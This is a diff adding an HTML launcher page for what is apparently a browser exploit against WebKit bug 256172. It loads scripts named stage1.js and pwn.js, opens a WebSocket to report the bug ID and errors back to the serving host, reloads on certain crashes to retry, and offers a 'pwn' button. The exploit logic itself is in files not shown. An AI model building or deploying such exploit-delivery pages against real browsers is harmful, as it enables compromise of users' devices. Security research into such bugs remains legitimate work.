@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script type="text/javascript" src="utils.js"></script>
+    <script type="text/javascript" src="helper.js"></script>
+    <script type="text/javascript" src="int64.js"></script>
+    <script type="text/javascript" src="stage1.js"></script>
+    <script type="text/javascript" src="pwn.js"></script>
+    <script>
+        var loc = window.location;
+        var wsProtocol = loc.protocol === 'https:' ? 'wss:' : 'ws:';
+        var wsURL = wsProtocol + '//' + loc.host + '/WebSocket';
+        try {
+            var ws = new WebSocket(wsURL);
+            ws.onopen = function() {
+                ws.send("WebKit-Bug-256172");
+            };
+        } catch (error) {
+            void(0);
+        }
+    </script>
+</head>
+<body>
+    <p id="log">
+    </p>
+    <script>
+    window.onerror = function(message, source, lineno, colno, error) {
+        try {
+            let ErrorName = error.name;
+        } catch (ee) {
+            document.getElementById("log").innerHTML += "<h1 style='color:red'>This browser is not supported!</h1>";
+            return true;
+        }
+        if ('InvalidStateError' == error.name) {
+            location.reload();
+        } else if ('TypeError' == error.name) {
+            location.reload();
+        } else {
+            document.getElementById("log").innerHTML += "<h1 style='color:red'>"+message+" @ "+lineno+"</h1>";
+            try {
+                ws.send(""+message+" @ "+lineno);
+            } catch (error) {
+                void(0);
+            }
+        }
+        return true;
+    };
+    </script>
+
+    <button onclick="pwn();">pwn</button>
+    
+</body>
+</html>
